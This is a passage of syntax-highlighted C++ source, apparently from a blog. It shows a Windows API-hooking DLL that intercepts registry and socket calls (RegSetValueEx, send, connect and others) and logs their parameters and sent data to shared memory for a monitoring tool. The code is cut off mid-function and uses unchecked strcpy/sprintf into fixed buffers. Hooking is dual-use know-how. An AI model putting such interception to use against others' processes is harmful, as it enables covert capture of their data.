class="number">2</span>], <span class="string">&quot;%08X&quot;</span>, dwBytes);</span><br><span class="line">        <span class="built_in">sprintf</span>(info10.Name[<span class="number">3</span>], <span class="string">&quot;内存块首地址&quot;</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(info10.Value[<span class="number">3</span>], <span class="string">&quot;%08X&quot;</span>, lpmem);</span><br><span class="line">        <span class="comment">/*int handle = strtoul(info10.Value[0], NULL, 16);</span></span><br><span class="line"><span class="comment">        if (heaphandle.find(handle) != heaphandle.end())</span></span><br><span class="line"><span class="comment">        &#123;*/</span></span><br><span class="line">        <span class="built_in">memcpy</span>(lpBase, &amp;info10, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line">        <span class="built_in">ReleaseSemaphore</span>(hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">        info10.Num = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">/* &#125;*/</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> lpmem;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">LONG</span><span class="params">(WINAPI* OldRegCreateKeyEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HKEY hKey,                                  <span class="comment">// handle to open key</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPCWSTR lpSubKey,                           <span class="comment">// subkey name</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD Reserved,                             <span class="comment">// reserved</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPWSTR lpClass,                             <span class="comment">// class string</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwOptions,                            <span class="comment">// special options</span></span></span></span><br><span class="line"><span class="function"><span class="params">    REGSAM samDesired,                          <span class="comment">// desired security access</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> LPSECURITY_ATTRIBUTES lpSecurityAttributes, <span class="comment">// inheritance</span></span></span></span><br><span class="line"><span class="function"><span class="params">    PHKEY phkResult,                            <span class="comment">// key handle </span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPDWORD lpdwDisposition                     <span class="comment">// disposition value buffer</span></span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>= RegCreateKeyEx;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function">LONG WINAPI <span class="title">NewRegCreateKeyEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HKEY hKey,                                  <span class="comment">// handle to open key</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPCWSTR lpSubKey,                           <span class="comment">// subkey name</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD Reserved,                             <span class="comment">// reserved</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPWSTR lpClass,                             <span class="comment">// class string</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwOptions,                            <span class="comment">// special options</span></span></span></span><br><span class="line"><span class="function"><span class="params">    REGSAM samDesired,                          <span class="comment">// desired security access</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> LPSECURITY_ATTRIBUTES lpSecurityAttributes, <span class="comment">// inheritance</span></span></span></span><br><span class="line"><span class="function"><span class="params">    PHKEY phkResult,                            <span class="comment">// key handle </span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPDWORD lpdwDisposition                     <span class="comment">// disposition value buffer</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>&#123;</span><br><span class="line">    info info11;</span><br><span class="line">    info11.type = REGCREATEKEYEX;</span><br><span class="line">    info11.Num = <span class="number">9</span>;</span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;(info11.st));</span><br><span class="line">    <span class="comment">//参数名称</span></span><br><span class="line">    <span class="built_in">sprintf</span>(info11.Name[<span class="number">0</span>], <span class="string">&quot;hKey&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info11.Name[<span class="number">1</span>], <span class="string">&quot;lpSubKey&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info11.Name[<span class="number">2</span>], <span class="string">&quot;Reserved&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info11.Name[<span class="number">3</span>], <span class="string">&quot;lpClass&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info11.Name[<span class="number">4</span>], <span class="string">&quot;dwOptions&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info11.Name[<span class="number">5</span>], <span class="string">&quot;samDesired&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info11.Name[<span class="number">6</span>], <span class="string">&quot;lpSecurityAttributes&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info11.Name[<span class="number">7</span>], <span class="string">&quot;phkResult&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info11.Name[<span class="number">8</span>], <span class="string">&quot;lpdwDisposition&quot;</span>);</span><br><span class="line">    <span class="comment">//参数键值</span></span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">70</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(info11.Value[<span class="number">0</span>], <span class="string">&quot;%08X&quot;</span>, hKey);</span><br><span class="line">    <span class="comment">// 宽字节转char</span></span><br><span class="line">    <span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(temp));</span><br><span class="line">    <span class="built_in">WideCharToMultiByte</span>(CP_ACP, <span class="number">0</span>, lpSubKey, <span class="built_in">wcslen</span>(lpSubKey), temp, <span class="built_in"><span class="keyword">sizeof</span></span>(temp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(info11.Value[<span class="number">1</span>], temp);</span><br><span class="line">    <span class="built_in">sprintf</span>(info11.Value[<span class="number">2</span>], <span class="string">&quot;%08X&quot;</span>, Reserved);</span><br><span class="line">    <span class="built_in">sprintf</span>(info11.Value[<span class="number">3</span>], <span class="string">&quot;%08X&quot;</span>, lpClass);</span><br><span class="line">    <span class="built_in">sprintf</span>(info11.Value[<span class="number">4</span>], <span class="string">&quot;%08X&quot;</span>, dwOptions);</span><br><span class="line">    <span class="built_in">sprintf</span>(info11.Value[<span class="number">5</span>], <span class="string">&quot;%08X&quot;</span>, samDesired);</span><br><span class="line">    <span class="built_in">sprintf</span>(info11.Value[<span class="number">6</span>], <span class="string">&quot;%08X&quot;</span>, lpSecurityAttributes);</span><br><span class="line">    <span class="built_in">sprintf</span>(info11.Value[<span class="number">7</span>], <span class="string">&quot;%08X&quot;</span>, phkResult);</span><br><span class="line">    <span class="built_in">sprintf</span>(info11.Value[<span class="number">8</span>], <span class="string">&quot;%08X&quot;</span>, lpdwDisposition);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(lpBase, &amp;info11, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">OldRegCreateKeyEx</span>(hKey, lpSubKey, Reserved, lpClass, dwOptions, samDesired, lpSecurityAttributes, phkResult, lpdwDisposition);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">LONG</span><span class="params">(WINAPI* OldRegSetValueEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HKEY       hKey,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCWSTR    lpValueName,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD      Reserved,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD      dwType,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> BYTE* lpData,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD      cbData)</span> </span>= RegSetValueEx;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)<span class="function">LSTATUS WINAPI <span class="title">NewRegSetValueEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HKEY       hKey,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCWSTR    lpValueName,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD      Reserved,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD      dwType,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> BYTE * lpData,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD      cbData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">70</span>];</span><br><span class="line">    info info12;</span><br><span class="line">    info12.Num = <span class="number">6</span>;</span><br><span class="line">    <span class="comment">// 参数名</span></span><br><span class="line">    <span class="built_in">sprintf</span>(info12.Name[<span class="number">0</span>], <span class="string">&quot;hKey&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info12.Name[<span class="number">1</span>], <span class="string">&quot;lpValueName&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info12.Name[<span class="number">2</span>], <span class="string">&quot;Reserved&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info12.Name[<span class="number">3</span>], <span class="string">&quot;dwType&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info12.Name[<span class="number">4</span>], <span class="string">&quot;lpData&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info12.Name[<span class="number">5</span>], <span class="string">&quot;cbData&quot;</span>);</span><br><span class="line">    <span class="comment">// 参数值</span></span><br><span class="line">    <span class="built_in">sprintf</span>(info12.Value[<span class="number">0</span>], <span class="string">&quot;%08X&quot;</span>, hKey);</span><br><span class="line">    <span class="comment">// 宽字节转char</span></span><br><span class="line">    <span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(temp));</span><br><span class="line">    <span class="built_in">WideCharToMultiByte</span>(CP_ACP, <span class="number">0</span>, lpValueName, <span class="built_in">wcslen</span>(lpValueName), temp, <span class="built_in"><span class="keyword">sizeof</span></span>(temp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(info12.Value[<span class="number">1</span>], temp);</span><br><span class="line">    <span class="built_in">sprintf</span>(info12.Value[<span class="number">2</span>], <span class="string">&quot;%08X&quot;</span>, Reserved);</span><br><span class="line">    <span class="built_in">sprintf</span>(info12.Value[<span class="number">3</span>], <span class="string">&quot;%08X&quot;</span>, dwType);</span><br><span class="line">    <span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(temp));</span><br><span class="line">    <span class="built_in">WideCharToMultiByte</span>(CP_ACP, <span class="number">0</span>, (LPCWCH)lpData, <span class="built_in">wcslen</span>((LPCWCH)lpData), temp, <span class="built_in"><span class="keyword">sizeof</span></span>(temp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(info12.Value[<span class="number">4</span>], temp);</span><br><span class="line">    <span class="built_in">sprintf</span>(info12.Value[<span class="number">5</span>], <span class="string">&quot;%08X&quot;</span>, cbData);</span><br><span class="line">    info12.type = REGSETVALUEEX;</span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;(info12.st));</span><br><span class="line">    <span class="built_in">memcpy</span>(lpBase, &amp;info12, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">OldRegSetValueEx</span>(hKey, lpValueName, Reserved, dwType, lpData, cbData);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">LSTATUS</span><span class="params">(WINAPI* OldRegCloseKey)</span><span class="params">(HKEY hKey)</span> </span>= RegCloseKey;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)<span class="function">LSTATUS WINAPI <span class="title">NewRegCloseKey</span><span class="params">(HKEY hKey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    info info13;</span><br><span class="line">    info13.Num = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 参数名</span></span><br><span class="line">    <span class="built_in">sprintf</span>(info13.Name[<span class="number">0</span>], <span class="string">&quot;hKey&quot;</span>);</span><br><span class="line">    <span class="comment">// 参数值</span></span><br><span class="line">    <span class="built_in">sprintf</span>(info13.Value[<span class="number">0</span>], <span class="string">&quot;%08X&quot;</span>, hKey);</span><br><span class="line">    info13.type = REGCLOSEKEY;</span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;(info13.st));</span><br><span class="line">    <span class="built_in">memcpy</span>(lpBase, &amp;info13, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">OldRegCloseKey</span>(hKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">LSTATUS</span><span class="params">(WINAPI* OldRegOpenKeyEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HKEY    hKey,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCWSTR lpSubKey,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD   ulOptions,</span></span></span><br><span class="line"><span class="function"><span class="params">    REGSAM  samDesired,</span></span></span><br><span class="line"><span class="function"><span class="params">    PHKEY   phkResult</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>= RegOpenKeyEx;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)<span class="function">LSTATUS WINAPI <span class="title">NewRegOpenKeyEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HKEY    hKey,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCWSTR lpSubKey,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD   ulOptions,</span></span></span><br><span class="line"><span class="function"><span class="params">    REGSAM  samDesired,</span></span></span><br><span class="line"><span class="function"><span class="params">    PHKEY   phkResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">70</span>];</span><br><span class="line">    info info14;</span><br><span class="line">    info14.Num = <span class="number">5</span>;</span><br><span class="line">    <span class="comment">// 参数名</span></span><br><span class="line">    <span class="built_in">sprintf</span>(info14.Name[<span class="number">0</span>], <span class="string">&quot;hKey&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info14.Name[<span class="number">1</span>], <span class="string">&quot;lpSubKey&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info14.Name[<span class="number">2</span>], <span class="string">&quot;ulOptions&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info14.Name[<span class="number">3</span>], <span class="string">&quot;samDesired&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info14.Name[<span class="number">4</span>], <span class="string">&quot;phkResult&quot;</span>);</span><br><span class="line">    <span class="comment">// 参数值</span></span><br><span class="line">    <span class="built_in">sprintf</span>(info14.Value[<span class="number">0</span>], <span class="string">&quot;%08X&quot;</span>, hKey);</span><br><span class="line">    <span class="comment">// 宽字节转char</span></span><br><span class="line">    <span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(temp));</span><br><span class="line">    <span class="built_in">WideCharToMultiByte</span>(CP_ACP, <span class="number">0</span>, lpSubKey, <span class="built_in">wcslen</span>(lpSubKey), temp, <span class="built_in"><span class="keyword">sizeof</span></span>(temp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(info14.Value[<span class="number">1</span>], temp);</span><br><span class="line">    <span class="built_in">sprintf</span>(info14.Value[<span class="number">2</span>], <span class="string">&quot;%08X&quot;</span>, ulOptions);</span><br><span class="line">    <span class="built_in">sprintf</span>(info14.Value[<span class="number">3</span>], <span class="string">&quot;%08X&quot;</span>, samDesired);</span><br><span class="line">    <span class="built_in">sprintf</span>(info14.Value[<span class="number">4</span>], <span class="string">&quot;%08X&quot;</span>, phkResult);</span><br><span class="line"></span><br><span class="line">    info14.type = REGOPENKEYEX;</span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;(info14.st));</span><br><span class="line">    <span class="built_in">memcpy</span>(lpBase, &amp;info14, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">OldRegOpenKeyEx</span>(hKey, lpSubKey, ulOptions, samDesired, phkResult);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">LSTATUS</span><span class="params">(WINAPI* OldRegDeleteValue)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HKEY    hKey,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCWSTR lpValueName</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>= RegDeleteValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)<span class="function">LSTATUS WINAPI <span class="title">NewRegDeleteValue</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HKEY    hKey,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCWSTR lpValueName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">70</span>];</span><br><span class="line">    info info15;</span><br><span class="line">    info15.Num = <span class="number">2</span>;</span><br><span class="line">    <span class="comment">// 参数名</span></span><br><span class="line">    <span class="built_in">sprintf</span>(info15.Name[<span class="number">0</span>], <span class="string">&quot;hKey&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info15.Name[<span class="number">1</span>], <span class="string">&quot;lpValueName&quot;</span>);</span><br><span class="line">    <span class="comment">// 参数值</span></span><br><span class="line">    <span class="built_in">sprintf</span>(info15.Value[<span class="number">0</span>], <span class="string">&quot;%08X&quot;</span>, hKey);</span><br><span class="line">    <span class="comment">// 宽字节转char</span></span><br><span class="line">    <span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(temp));</span><br><span class="line">    <span class="built_in">WideCharToMultiByte</span>(CP_ACP, <span class="number">0</span>, lpValueName, <span class="built_in">wcslen</span>(lpValueName), temp, <span class="built_in"><span class="keyword">sizeof</span></span>(temp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(info15.Value[<span class="number">1</span>], temp);</span><br><span class="line">    info15.type = REGDELETEVALUE;</span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;(info15.st));</span><br><span class="line">    <span class="built_in">memcpy</span>(lpBase, &amp;info15, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">OldRegDeleteValue</span>(hKey, lpValueName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">SOCKET</span> <span class="params">(WINAPI* Oldsocket)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> af,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> type,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> protocol</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>= socket;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)<span class="function">SOCKET WINAPI <span class="title">Newsocket</span><span class="params">(<span class="keyword">int</span> af, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span> </span>&#123;</span><br><span class="line">    info info16;</span><br><span class="line">    info16.Num = <span class="number">3</span>;</span><br><span class="line">    <span class="comment">// 参数名</span></span><br><span class="line">    <span class="built_in">sprintf</span>(info16.Name[<span class="number">0</span>], <span class="string">&quot;af&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info16.Name[<span class="number">1</span>], <span class="string">&quot;type&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info16.Name[<span class="number">2</span>], <span class="string">&quot;protocol&quot;</span>);</span><br><span class="line">    <span class="comment">// 参数值</span></span><br><span class="line">    <span class="built_in">sprintf</span>(info16.Value[<span class="number">0</span>], <span class="string">&quot;%08X&quot;</span>, af);</span><br><span class="line">    <span class="built_in">sprintf</span>(info16.Value[<span class="number">1</span>], <span class="string">&quot;%08X&quot;</span>, type);</span><br><span class="line">    <span class="built_in">sprintf</span>(info16.Value[<span class="number">2</span>], <span class="string">&quot;%08X&quot;</span>, protocol);</span><br><span class="line">    info16.type = THESOCKET;</span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;(info16.st));</span><br><span class="line">    <span class="built_in">memcpy</span>(lpBase, &amp;info16, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    info16.Num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Oldsocket</span>(af, type, protocol);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(WINAPI* Oldbind)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    SOCKET         s,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> sockaddr* name,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span>            namelen</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>= bind;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)<span class="function"><span class="keyword">int</span> WINAPI <span class="title">Newbind</span><span class="params">(SOCKET s, <span class="keyword">const</span> sockaddr * name, <span class="keyword">int</span> namelen)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//name-&gt;sa_data</span></span><br><span class="line">    info info17;</span><br><span class="line">    info17.Num = <span class="number">5</span>;</span><br><span class="line">    <span class="comment">// 参数名</span></span><br><span class="line">    <span class="built_in">sprintf</span>(info17.Name[<span class="number">0</span>], <span class="string">&quot;s&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info17.Name[<span class="number">1</span>], <span class="string">&quot;name&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info17.Name[<span class="number">2</span>], <span class="string">&quot;namelen&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info17.Name[<span class="number">3</span>], <span class="string">&quot;IP&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info17.Name[<span class="number">4</span>], <span class="string">&quot;port&quot;</span>);</span><br><span class="line">    <span class="comment">// 参数值</span></span><br><span class="line">    <span class="built_in">sprintf</span>(info17.Value[<span class="number">0</span>], <span class="string">&quot;%08X&quot;</span>, s);</span><br><span class="line">    <span class="built_in">sprintf</span>(info17.Value[<span class="number">1</span>], <span class="string">&quot;%08X&quot;</span>, name);</span><br><span class="line">    <span class="built_in">sprintf</span>(info17.Value[<span class="number">2</span>], <span class="string">&quot;%08X&quot;</span>, namelen);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span>* <span class="title">sock</span> =</span> (struct sockaddr_in*)name;</span><br><span class="line">    <span class="keyword">int</span> port = <span class="built_in">ntohs</span>(sock-&gt;sin_port);</span><br><span class="line">    <span class="built_in">sprintf</span>(info17.Value[<span class="number">3</span>], <span class="string">&quot;%s&quot;</span>, <span class="built_in">inet_ntoa</span>(sock-&gt;sin_addr));</span><br><span class="line">    <span class="built_in">sprintf</span>(info17.Value[<span class="number">4</span>], <span class="string">&quot;%d&quot;</span>, port);</span><br><span class="line">    info17.type = BIND;</span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;(info17.st));</span><br><span class="line">    <span class="built_in">memcpy</span>(lpBase, &amp;info17, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    info17.Num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Oldbind</span>(s, name, namelen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(WINAPI* Oldsend)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    SOCKET     s,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span>* buf,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span>        len,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span>        flags</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>= send;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)<span class="function"><span class="keyword">int</span> WINAPI <span class="title">Newsend</span><span class="params">(SOCKET s, <span class="keyword">const</span> <span class="keyword">char</span>* buf, <span class="keyword">int</span> len, <span class="keyword">int</span> flags)</span> </span>&#123;</span><br><span class="line">    info info18;</span><br><span class="line">    info18.Num = <span class="number">5</span>;</span><br><span class="line">    <span class="comment">// 参数名</span></span><br><span class="line">    <span class="built_in">sprintf</span>(info18.Name[<span class="number">0</span>], <span class="string">&quot;s&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info18.Name[<span class="number">1</span>], <span class="string">&quot;buf&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info18.Name[<span class="number">2</span>], <span class="string">&quot;len&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info18.Name[<span class="number">3</span>], <span class="string">&quot;flags&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info18.Name[<span class="number">4</span>], <span class="string">&quot;发送数据&quot;</span>);</span><br><span class="line">    <span class="comment">// 参数值</span></span><br><span class="line">    <span class="built_in">sprintf</span>(info18.Value[<span class="number">0</span>], <span class="string">&quot;%08X&quot;</span>, s);</span><br><span class="line">    <span class="built_in">sprintf</span>(info18.Value[<span class="number">1</span>], <span class="string">&quot;%08X&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">sprintf</span>(info18.Value[<span class="number">2</span>], <span class="string">&quot;%08X&quot;</span>, len);</span><br><span class="line">    <span class="built_in">sprintf</span>(info18.Value[<span class="number">3</span>], <span class="string">&quot;%08X&quot;</span>, flags);</span><br><span class="line">    <span class="built_in">sprintf</span>(info18.Value[<span class="number">4</span>], <span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    <span class="comment">/*FILE* f = fopen(&quot;test.txt&quot;, &quot;a+&quot;);</span></span><br><span class="line"><span class="comment">    fprintf(f, &quot;发送数据：%s\nsendinfo中：%s&quot;,buf,info18.Value[4]);</span></span><br><span class="line"><span class="comment">    fclose(f);*/</span></span><br><span class="line">    info18.type = SEND;</span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;(info18.st));</span><br><span class="line">    <span class="built_in">memcpy</span>(lpBase, &amp;info18, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    info18.Num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Oldsend</span>(s, buf, len, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(WINAPI* Oldconnect)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    SOCKET         s,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> sockaddr* name,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span>            namelen</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>= connect;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)<span class="function"><span class="keyword">int</span> WINAPI <span class="title">Newconnect</span><span class="params">(SOCKET s, <span class="keyword">const</span> sockaddr * name, <span class="keyword">int</span> namelen)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//name-&gt;sa_data</span></span><br><span class="line">    info info19;</span><br><span class="line">    info19.Num = <span class="number">5</span>;</span><br><span class="line">    <span class="comment">// 参数名</span></span><br><span class="line">    <span class="built_in">sprintf</span>(info19.Name[<span class="number">0</span>], <span 